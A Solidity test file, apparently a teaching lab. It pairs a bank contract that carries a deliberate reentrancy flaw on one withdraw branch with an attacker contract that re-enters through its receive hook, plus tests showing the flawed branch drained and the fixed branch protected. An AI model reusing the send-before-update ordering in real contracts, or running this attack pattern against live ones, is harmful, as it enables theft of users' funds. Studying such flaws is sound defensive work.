// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Known intentional reentrancy lab case, in one branch only.
contract D24MConditionalBank {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw(bool unsafePath) external {
        uint256 amount=balances[msg.sender];
        require(amount!=0,"NO_BALANCE");
        if (unsafePath) {
            (bool ok,) = msg.sender.call{value:amount}("");
            require(ok,"SEND_FAILED");
            balances[msg.sender]=0;
        } else {
            balances[msg.sender]=0;
            (bool ok,) = msg.sender.call{value:amount}("");
            require(ok,"SEND_FAILED");
        }
    }
}

contract D24MActor {
    D24MConditionalBank internal target;
    bool internal unsafePath;
    bool internal alreadyReentered;
    bool public retrySucceeded;

    function initiate(D24MConditionalBank bank,bool flag) external payable {
        target=bank;
        unsafePath=flag;
        bank.deposit{value:msg.value}();
        bank.withdraw(flag);
    }
    receive() external payable {
        if (!alreadyReentered) {
            alreadyReentered=true;
            (retrySucceeded,)=address(target).call(abi.encodeWithSignature(
                "withdraw(bool)",unsafePath));
        }
    }
}

interface D24MCheatcodes { function deal(address who,uint256 value) external; }

contract D24MBranchValueTest {
    D24MCheatcodes constant vm=D24MCheatcodes(address(uint160(uint256(keccak256("hevm cheat code")))));
    function setUp() public {vm.deal(address(this),10 ether);}

    function test_branch_true_has_reentrant_value_capture() public {
        D24MConditionalBank bank=new D24MConditionalBank();
        D24MActor actor=new D24MActor();
        bank.deposit{value:1 ether}();
        actor.initiate{value:1 ether}(bank,true);
        require(actor.retrySucceeded(),"NO_SECOND_WITHDRAW");
        require(address(actor).balance==2 ether,"NO_VALUE_CAPTURE");
        require(address(bank).balance==0,"BANK_NOT_DRAINED");
        require(bank.balances(address(this))==1 ether,"HONEST_ACCOUNTING_NOT_RETAINED");
    }

    function test_branch_false_blocks_reentrant_value_capture() public {
        D24MConditionalBank bank=new D24MConditionalBank();
        D24MActor actor=new D24MActor();
        bank.deposit{value:1 ether}();
        actor.initiate{value:1 ether}(bank,false);
        require(!actor.retrySucceeded(),"FIXED_BRANCH_ALLOWED_REENTER");
        require(address(actor).balance==1 ether,"FIXED_BRANCH_GAVE_EXTRA_ETH");
        require(address(bank).balance==1 ether,"HONEST_FUNDS_NOT_PRESERVED");
        require(bank.balances(address(this))==1 ether,"HONEST_LEDGER_INCORRECT");
    }

    function test_honest_single_withdraw_preserves_value_on_both_paths() public {
        for (uint256 i=0;i<2;++i) {
            D24MConditionalBank bank=new D24MConditionalBank();
            bank.deposit{value:1 ether}();
            uint256 start=address(this).balance;
            bank.withdraw(i==1);
            require(address(this).balance==start+1 ether,"HONEST_WITHDRAW_MISMATCH");
            require(address(bank).balance==0,"HONEST_BANK_NOT_EMPTY");
            require(bank.balances(address(this))==0,"HONEST_LEDGER_INCORRECT");
        }
    }

    receive() external payable {}
}
